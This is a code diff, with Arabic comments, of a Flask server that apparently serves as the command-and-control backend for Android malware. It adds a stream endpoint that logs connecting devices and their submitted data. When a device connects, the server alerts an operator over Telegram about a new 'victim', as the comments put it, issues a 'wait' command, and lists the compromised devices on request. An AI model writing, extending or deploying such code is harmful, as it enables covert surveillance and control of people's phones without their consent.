@@ -27,23 +27,22 @@ def index():
         "version": "7.11"
     }), 200
 
-# نقطة استقبال اتصال الأجهزة والعملاء
+# نقطة استقبال اتصال الأجهزة عبر الـ Stream (المطابقة لتطبيق الأندرويد)
+@app.route('/api/v1/stream', methods=['POST', 'GET'])
 @app.route('/api/connect', methods=['POST'])
 def agent_connect():
     try:
-        data = request.json
-        if not data:
-            return jsonify({"error": "No data received"}), 400
+        data = request.json if request.is_json else request.form.to_dict()
+        device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
         
-        device_id = data.get('device_id', 'Unknown')
-        connected_devices[device_id] = data
+        connected_devices[device_id] = data or {"status": "connected"}
         logger.info(f"Device connected successfully: {device_id}")
         
-        # إرسال إشعار فوري عبر بوت التليجرام عند اتصال ضحية جديدة
+        # إرسال إشعار فوري عبر بوت التليجرام عند اتصال الضحية
         if bot and ADMIN_ID:
             bot.send_message(
                 ADMIN_ID, 
-                f"🚨 <b>اتصال جديد ناجح!</b>\n\n- معرف الجهاز: <code>{device_id}</code>"
+                f"🚨 <b>اتصال جديد ناجح من التطبيق!</b>\n\n- معرف الجهاز: <code>{device_id}</code>"
             )
         
         return jsonify({"status": "success", "command": "wait"}), 200
@@ -97,7 +96,7 @@ if bot:
             msg += f"- <code>{dev_id}</code>\n"
         bot.reply_to(message, msg)
 
-    # تشغيل البوت في خيط خلفي (Background Thread) ليعمل بالتوازي مع السيرفر
+    # تشغيل البوت في خيط خلفي (Background Thread)
     def run_bot():
         logger.info("Starting Telegram Bot Polling...")
         try:
